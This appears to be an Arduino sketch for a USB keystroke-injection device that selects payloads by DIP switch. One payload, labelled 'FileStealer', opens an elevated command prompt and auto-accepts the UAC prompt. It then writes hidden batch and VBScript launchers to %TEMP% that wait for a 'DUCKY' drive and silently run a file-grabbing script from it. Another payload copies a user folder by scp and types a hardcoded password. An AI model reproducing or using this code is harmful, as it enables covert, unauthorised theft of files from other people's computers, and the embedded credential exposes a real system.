#include "Keyboard.h"
String dip = "";

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void P0000(){
//----------------------------
//  NULL -Intentionally left
//  empty for Reprogram Mode
//----------------------------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  Keyboard.end();
}

void P0001(){
//----------------------------
//    RPIAutoBackup
//----------------------------
//Open cmd No UAC bypass
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Open bash
  Keyboard.print("cls && bash && exit");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(600);
//Linux commands for scp (with delete prompt) see RPIAutoBackup for full description
  Keyboard.print("clear && scp -r /mnt/c/Users/Jacob\\ Still/Desktop/AutoBackup/ pi@192.168.1.219:/home/pi/ && echo scp succeded && cd /mnt/c/Users/Jacob\\ Still/Desktop && echo cd succeded && read -p \"would you like to delete files on local machine? \" -a prompt -t 5 && if [ $prompt = \"y\" ]; then rm -r AutoBackup/ && mkdir AutoBackup && echo rm succeded || echo Operation Failed; elif [ $prompt = \"n\" ]; then echo Not Deleting Files; else echo Not Deleting Files && exit; fi && exit || echo Not Deleting Files && exit");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
//Enter Pi's password
  Keyboard.print("4jkk214");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}

void P0010(){
//----------------------------
//    FileStealer
//----------------------------
//cmd and Bypass UAC
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(250);
  Keyboard.print("powershell start-process cmd.exe -verb runAs");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1500);
//CD to TEMP
  Keyboard.print("cd %TEMP%");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Erase DuckyWait.bat
  Keyboard.print("erase /Q DuckyWait.bat");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Create DuckyWait.bat
  Keyboard.print("copy con DuckyWait.bat");
  typeKey(KEY_RETURN);
  Keyboard.print("@echo off");
  typeKey(KEY_RETURN);
  Keyboard.print(":while1");
  typeKey(KEY_RETURN);
  Keyboard.print("for /f \"tokens=3 delims= \" %%A in ('echo list volume ^| diskpart ^| findstr \"DUCKY\"') DO (set DUCKYdrive=%%A:)");
  typeKey(KEY_RETURN);
  Keyboard.print("if [%DUCKYdrive%] EQU [] (");
  typeKey(KEY_RETURN);
  Keyboard.print("timeout /t 3");
  typeKey(KEY_RETURN);
  Keyboard.print("goto :while1");
  typeKey(KEY_RETURN);
  Keyboard.print(") else (");
  typeKey(KEY_RETURN);
  Keyboard.print("goto :break");
  typeKey(KEY_RETURN);
  Keyboard.print(")");
  typeKey(KEY_RETURN);
  Keyboard.print("timeout /t 30");
  typeKey(KEY_RETURN);
  Keyboard.print("goto :while1");
  typeKey(KEY_RETURN);
  Keyboard.print(":break");
  typeKey(KEY_RETURN);
  Keyboard.print("wscript.exe invis.vbs %DUCKYdrive%\\Duckslurp\\Duckslurp.bat");
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.print("z");
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Erase invis.vbs
  Keyboard.print("erase /Q invis.vbs");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Create invis.vbs
  Keyboard.print("copy con invis.vbs");
  typeKey(KEY_RETURN);
  Keyboard.print("CreateObject(\"Wscript.Shell\").Run\"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.print("z");
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Launch invisible DuckyWait.bat and exit
  Keyboard.print("wscript.exe invis.vbs DuckyWait.bat");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
/*
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
*/
  Keyboard.releaseAll();
  Keyboard.end();
}

void P0011(){
//----------------------------
//        Place holder
//----------------------------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("0011 or above");
  Keyboard.releaseAll();
  Keyboard.end();
}

void setup(){
//Detekt DIP switch config for rekking de confuzer
  dip = "";
  pinMode(6, INPUT_PULLUP);
  pinMode(7, INPUT_PULLUP);
  pinMode(8, INPUT_PULLUP);
  pinMode(9, INPUT_PULLUP);
  if(digitalRead(6) == LOW){dip += "1";}else{dip += "0";}
  if(digitalRead(7) == LOW){dip += "1";}else{dip += "0";}
  if(digitalRead(8) == LOW){dip += "1";}else{dip += "0";}
  if(digitalRead(9) == LOW){dip += "1";}else{dip += "0";}
//Setup Keyboard protocols ((obviously)
  Keyboard.begin();
  delay(750);
//Execute payload
  if(dip == "0000"){
    P0000();
  }
  if(dip == "0001"){
    P0001();
  }
  if(dip == "0010"){
    P0010();
  }
  if(dip == "0011"){
    P0011();
  }
  Keyboard.end();
}

void loop(){
//Unused bc we dont want to loop the payloads
// could use :
// while(true){} to end payloads
// but not worth the effort
}

